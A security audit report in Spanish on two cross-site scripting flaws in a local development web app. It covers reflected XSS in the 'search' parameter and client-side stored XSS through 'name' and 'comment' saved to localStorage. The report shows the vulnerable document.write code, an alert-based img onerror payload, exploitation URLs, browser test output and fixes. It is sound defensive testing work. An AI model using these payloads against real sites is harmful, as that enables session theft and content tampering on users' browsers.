# Informe de auditoria XSS

- Objetivo auditado: `http://web.dev.local:8082`
- Tipo de analisis: Cross-Site Scripting (XSS)
- Estado: Vulnerabilidades confirmadas y explotadas

## Resumen ejecutivo

Se identificaron dos vulnerabilidades XSS explotables:

1. **XSS reflejado** en el parametro `search`.
2. **XSS almacenado/persistente en cliente** en los parametros `name` y `comment`, guardados en `localStorage` y renderizados sin saneado.

Ambas vulnerabilidades permiten ejecutar JavaScript arbitrario en el contexto de la aplicacion.

## Metodologia

Se realizo:

- Reconocimiento del HTML y formularios.
- Revision de los sinks DOM presentes en la pagina.
- Validacion con navegador real usando `puppeteer`.

## Hallazgo 1: XSS reflejado en `search`

### Ubicacion

En el bloque de busqueda, el valor de `search` se toma desde `URLSearchParams` y se inserta directamente en el DOM:

```html
const searchTerm = urlParams.get('search');
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

### Payload de prueba

```html
<img src=x onerror=alert("RXSS")>
```

### URL de explotacion

```text
http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(%22RXSS%22)%3E
```

### Evidencia

La ejecucion con navegador automatizado disparo el dialogo JavaScript:

```text
REFLECTED_DIALOG:RXSS
REFLECTED_STATUS:true
```

### Impacto

Un atacante podria enviar un enlace malicioso y ejecutar JavaScript en el navegador de la victima, con impacto potencial en robo de sesion, phishing DOM o alteracion del contenido.

## Hallazgo 2: XSS almacenado en cliente en comentarios

### Ubicacion

Los parametros `name` y `comment` se almacenan sin saneado en `localStorage`:

```html
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));
```

Posteriormente se renderizan con `document.write(...)`:

```html
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

### Payload de prueba

```html
<img src=x onerror=alert("SXSS")>
```

### URL de explotacion

```text
http://web.dev.local:8082/?name=auditor&comment=%3Cimg%20src%3Dx%20onerror%3Dalert(%22SXSS%22)%3E
```

### Evidencia

La prueba con `puppeteer` confirmo ejecucion de JavaScript al almacenar y volver a visualizar el comentario:

```text
STORED_DIALOG:SXSS
STORED_DIALOG:SXSS
STORED_STATUS:true
COMMENTS:[{"name":"auditor","comment":"<img src=x onerror=alert(\"SXSS\")>","date":"4/20/2026, 12:26:31 PM"}]
```

### Impacto

Cualquier usuario que cargue la pagina en un navegador/perfil donde exista ese comentario almacenado ejecutara codigo arbitrario. Aunque el almacenamiento es del lado cliente, sigue siendo una vulnerabilidad XSS persistente en ese contexto.

## Causa raiz

- Uso de `document.write(...)` con datos no confiables.
- Ausencia total de escape/saneado de entrada.
- Insercion directa de datos controlados por el usuario en HTML.

## Recomendaciones

1. No usar `document.write(...)` para renderizar datos de usuario.
2. Renderizar contenido con `textContent` o `createTextNode`.
3. Validar y sanear entradas antes de persistirlas.
4. Añadir una politica CSP restrictiva para reducir impacto.
5. Revisar todo el codigo cliente en busca de patrones DOM XSS equivalentes.

## Conclusion

El objetivo es **vulnerable a XSS** y la explotacion fue **verificada con exito** tanto para el flujo reflejado como para el flujo persistente en cliente.
